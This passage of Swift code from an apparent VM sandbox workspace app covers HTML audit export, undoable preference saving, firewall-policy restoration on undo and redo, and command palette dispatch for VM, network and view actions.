            let html = try await htmlExporter.renderStandaloneHTML(coordinator: coordinator)
            try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
            try Data(html.utf8).write(to: url, options: [.atomic])
            toastCenter.post(
                title: "Exported Standalone HTML Audit",
                detail: ByteMetricsFormatter.scrubHomePath(url.path),
                severity: .info
            )
        }
    }

    // MARK: - Preferences & Transactional Undo / Redo

    public func saveWorkspacePreferences(_ updated: WorkspacePreferences) {
        let previousManifest = manifest
        preferences = updated
        runCoordinatorTask(label: "Saving Workspace Preferences") { [self] in
            try await coordinator.undoRedo.execute(
                UpdateManifestPreferencesCommand(
                    preferences: updated,
                    previousManifest: previousManifest
                ),
                on: coordinator.store
            )
            await refreshAllState()
            toastCenter.post(
                title: "Preferences Saved",
                detail: "Recorded reversible UpdateManifestPreferencesCommand in SQLite journal.",
                severity: .info
            )
        }
    }

    public func performUndo() {
        guard canUndo else { return }
        runCoordinatorTask(label: "Undoing Mutation") { [self] in
            let summary = try await coordinator.undoRedo.undo(on: coordinator.store)
            let restoredPolicy = try await coordinator.store.fetchFirewallPolicy(activeFirewallPolicy.id)
            if let restoredPolicy {
                await coordinator.l2Switch.firewall.updatePolicy(restoredPolicy)
            }
            await refreshAllState()
            toastCenter.post(
                title: "Undid: \(summary.title)",
                detail: summary.payloadSummary,
                severity: .notice
            )
        }
    }

    public func performRedo() {
        guard canRedo else { return }
        runCoordinatorTask(label: "Redoing Mutation") { [self] in
            let summary = try await coordinator.undoRedo.redo(on: coordinator.store)
            let restoredPolicy = try await coordinator.store.fetchFirewallPolicy(activeFirewallPolicy.id)
            if let restoredPolicy {
                await coordinator.l2Switch.firewall.updatePolicy(restoredPolicy)
            }
            await refreshAllState()
            toastCenter.post(
                title: "Redid: \(summary.title)",
                detail: summary.payloadSummary,
                severity: .info
            )
        }
    }

    // MARK: - Command Palette Dispatch

    public func executeCommandPaletteAction(_ actionID: String) {
        switch actionID {
        case "vm.branch.cow":
            forkCoWBranch()
        case "vm.snapshot.live":
            captureCheckpoint()
        case "vm.lifecycle.boot":
            if let id = selectedVM?.id { toggleRunState(for: id) }
        case "vm.lifecycle.pause":
            if let id = selectedVM?.id { pauseVM(id) }
        case "net.pcap.export":
            exportPCAPNGDefault()
        case "net.policy.strict":
            applyFirewallPreset(.strictAgentAllowlistPreset())
        case "net.policy.airgap":
            applyFirewallPreset(.airgappedPreset())
        case "view.open.dag":
            docking.openOrFocus(kind: .snapshotBranchDAG)
        case "view.open.wiretap":
            docking.openOrFocus(kind: .packetWiretap)
        case "view.open.console":
            docking.openOrFocus(kind: .vt100SerialConsole)
        case "view.open.policy":
            docking.openOrFocus(kind: .firewallPolicyStudio)
        case "view.open.storage":
            docking.openOrFocus(kind: .storageAndCloudInit)
        case "view.open.plugins":
            docking.openOrFocus(kind: .pluginExtensionStudio)
        case "view.split.toggle":
            if docking.splitMode == .singlePane {
                docking.splitCurrentTabRight()
            } else {
                docking.collapseSplit()
            }
        case "workspace.undo":
            performUndo()
        case "workspace.redo":
            performRedo()
        case "plugins.export.html":
            exportHTMLSecurityReportDefault()
        case "plugins.export.hcl":
            exportHCLDefault()
        case "app.language.toggle":
            let updated = AgentVMLocalizer.shared.toggleLanguage()
            refreshLocalizedChrome()
            toastCenter.post(
                title: L("Switched to English", "已切换为简体中文"),
                detail: L("Interface language: \(updated.displayName) (\(updated.rawValue))", "当前界面语言: \(updated.displayName) (\(updated.rawValue))"),
                severity: .info
            )
        default:
            break
        }
    }

    // MARK: - Task Helper

    private func runCoordinatorTask(
        label: String,
        operation: @escaping @MainActor () async throws -> Void
    ) {
        lastStatusBanner = label
        isBusy = true
        Task { @MainActor [weak self] in
            guard let self else { return }
            defer {
                self.isBusy = false
                self.lastStatusBanner = "Workspace ready"
            }
            do {
                try await operation()
            } catch {
                self.toastCenter.post(
                    title: "\(label) Failed",
                    detail: error.localizedDescription,
                    severity: .error
                )
            }
        }
    }
}
